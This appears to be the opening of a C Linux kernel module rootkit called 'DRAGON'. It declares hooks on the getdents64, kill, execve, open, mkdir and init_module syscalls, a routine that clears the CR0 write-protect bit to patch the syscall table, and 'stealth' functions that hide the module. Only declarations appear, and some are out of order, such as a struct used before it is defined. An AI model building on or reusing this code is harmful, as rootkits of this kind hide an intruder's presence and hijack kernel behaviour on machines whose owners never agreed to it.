#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h>
#include <linux/version.h>
#include <linux/list.h>
#include <linux/types.h>
#include <linux/dirent.h>

#define DEBUG

/* Module informations */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Rick Astley");
MODULE_DESCRIPTION("https://www.youtube.com/watch?v=dQw4w9WgXcQ");


#ifdef DEBUG
#define debug_print pr_info
#else
#define debug_print
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#define USE_KPROBE 1
#include <linux/kprobes.h>
	struct kprobe kp =
	{
		.symbol_name = "kallsyms_lookup_name",
	};
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0) 
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)

#define KSLN_AVAILABLE 1
#include <linux/kallsyms.h>

#endif
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define USE_PT_REGS 1
#endif

#define DEBUG_PREFIX "[DRAGON-DEBUG]"

void signal_handler(int sig);

static int  __init lkm_init(void);
module_init(lkm_init);

static void __exit lkm_exit(void);
module_exit(lkm_exit);

/* 
	Typedef of the hooks and function wich are going to be hooked,
	
*/
#ifdef USE_PT_REGS	//Since kernel version 4.17, parameters to syscalls are passed using the pt_regs struct

/*Syscalls template */
typedef asmlinkage long (*sys_open_t)(const struct pt_regs*);
typedef asmlinkage long (*sys_kill_t)(const struct pt_regs*);
typedef asmlinkage long (*sys_execve_t)(const struct pt_regs*);
typedef asmlinkage long (*sys_getdents64_t)(const struct pt_regs*);
typedef asmlinkage long (*sys_init_module_t)(const struct pt_regs*);
typedef asmlinkage long (*sys_mkdir_t)(const struct pt_regs*);


/* Syscalls hook prototypes */
asmlinkage long hSys_mkdir(const struct pt_regs*);
asmlinkage long hSys_init_module(const struct pt_regs*);
asmlinkage long hSys_getdents64(const struct pt_regs*);
asmlinkage long hSys_execve(const struct pt_regs*);
asmlinkage long hSys_open(const struct pt_regs*);
asmlinkage long hSys_kill(const struct pt_regs*);

#else

/*Syscalls template */
typedef asmlinkage long(*sys_open_t)(const char __user*, int, umode_t);
typedef asmlinkage long(*sys_kill_t)(pid_t, int);
typedef asmlinkage long(*sys_execve_t)(const char __user*, const char __user *const __user *, const char __user *const __user*);
typedef asmlinkage long(*sys_getdents64_t)(unsigned int, struct linux_dirent64 __user*, unsigned int);

/* Syscalls hook prototypes */
asmlinkage long hSys_open(const char __user*, int, umode_t);
asmlinkage long hSys_kill(pid_t, int);
asmlinkage long hSys_execve(const char __user*, const char __user *const __user *, const char __user *const __user*);
asmlinkage long hSys_getdents64(unsigned int, struct linux_dirent64 __user*, unsigned int);
#endif

sys_getdents64_t oSys_getdents64;
sys_execve_t oSys_execve;
sys_kill_t oSys_kill;
sys_open_t oSys_open;
sys_init_module_t oSys_init_module;
sys_mkdir_t oSys_mkdir;


struct SYS_HOOK64 hook_mkdir;
/* 
	Hook syscall table

	First locate the sct table and then next cast it an array of void* or
	unsigned long and acced at the searched address with _NR_syscall included by linux/syscalls.h
*/

struct SYS_HOOK64
{
	//Indicate the status of the hook
	int bStatus;
	
	//A pointer to the sys call table
	unsigned long ** x64_sct;
	
	//The offset of the sys call
	unsigned long offset;

	//The address of the hook
	void * hook_address;
	
	//A pointer to the original function ptr
	unsigned long ** original_address;	
};

//Locate the sys call table 
static unsigned long ** get_x64sct_address(void); 

//Fill SYS_HOOK struct, used to have a better visibility
static void register_x64sct_hook(struct SYS_HOOK64 *, unsigned long, void *, unsigned long *, unsigned long **);


//Wrapper to install and uinstall hooks on sys call table
static int 	install_x64sct_hook	(struct SYS_HOOK64* );
static int 	uninstall_x64sct_hook(struct SYS_HOOK64* );

//Install and uninstall sys call table hooks
static unsigned long* __install_tramphook64(unsigned long, unsigned long *, unsigned long **);
static unsigned long* __uninstall_tramphook64(unsigned long, void*, unsigned long **);


/*
	Disable / enable write protections

	Overwrite the 16th byte in cr0 register to disable write protection,
	we can directly overwrite it because we are at ring 0 :)
*/

static inline void write_forced_cr0(unsigned long new_val);
static inline void disable_wp(void);
static inline void enable_wp(void);

/*
	Disable / enable stealth features

*/

static int hide_lkm(void);
static int show_lkm(void);